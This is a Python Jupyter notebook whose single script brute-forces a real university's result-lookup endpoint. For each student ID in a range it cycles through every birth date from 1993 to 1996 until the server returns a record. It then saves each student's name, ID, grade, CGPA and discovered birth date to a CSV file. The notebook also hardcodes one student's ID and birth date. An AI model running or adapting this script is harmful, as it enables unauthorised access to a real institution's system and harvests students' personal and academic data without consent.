{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import requests\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1522020012\n"
     ]
    }
   ],
   "source": [
    "BASE_URL = 'https://www.lus.ac.bd/wp-admin/admin-ajax.php'\n",
    "# Create your views here.\n",
    "def index():\n",
    "    student_id = '1512020284'\n",
    "    birth_date = '1996-12-04'\n",
    "\n",
    "    all_results = pd.DataFrame()\n",
    "    \n",
    "    for id in range(1522020012, 1522020050):\n",
    "        student_id = str(id)\n",
    "        print(student_id)\n",
    "        \n",
    "        flag = False\n",
    "        \n",
    "        for year in range(1993, 1997):\n",
    "            for month in range(1, 13):\n",
    "                for date in range(1, 32):\n",
    "                    birth_year = str(year)\n",
    "                    birth_month = ''\n",
    "                    birth_date2 = ''\n",
    "\n",
    "                    if month < 10:\n",
    "                        birth_month = '0'.join(str(month))\n",
    "                    else:\n",
    "                        birth_month = str(month)\n",
    "\n",
    "                    if date < 10:\n",
    "                        birth_date2 = '0'.join(str(date))\n",
    "                    else:\n",
    "                        birth_date2 = str(date)\n",
    "\n",
    "                    birth_date = birth_year+'-'+birth_month+'-'+birth_date2\n",
    "\n",
    "                    my_data = {\n",
    "                        'student_id':student_id,\n",
    "                        'birth_date':birth_date,\n",
    "                        'action': 'get-result'\n",
    "                    }\n",
    "\n",
    "                    x = requests.post(BASE_URL, data = my_data)\n",
    "                    #print(x.content)\n",
    "                    data = x.json()\n",
    "\n",
    "                    if( data['success'] ):\n",
    "                        print(data['success'])\n",
    "                        # print(data['student']['name'])\n",
    "                        # print(data['student']['id'])\n",
    "                        # print(data['student']['grade'])\n",
    "                        # print(data['student']['cgpa'])\n",
    "\n",
    "                        result = pd.DataFrame(\n",
    "                            {\n",
    "                                'Student ID':[data['student']['id']],\n",
    "                                'Student Name':[data['student']['name']],\n",
    "                                'Grade':[data['student']['grade']],\n",
    "                                'CGPA':[data['student']['cgpa']],\n",
    "                                'Birth Date':[birth_date]\n",
    "                            },\n",
    "                            columns=[\"Student ID\", \"Student Name\", \"Grade\", \"CGPA\", \"Birth Date\"],\n",
    "                            index = [1]\n",
    "                        )\n",
    "\n",
    "                        print(result)\n",
    "\n",
    "                        all_results = all_results.append(result, ignore_index = True)\n",
    "                        flag = True\n",
    "                        break\n",
    "                if flag:\n",
    "                    break\n",
    "            if flag:\n",
    "                break\n",
    "                \n",
    "    print(all_results)\n",
    "    all_results.to_csv('all_result.csv')\n",
    "    read_result = pd.read_csv('all_result.csv')\n",
    "    read_result\n",
    "\n",
    "index()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
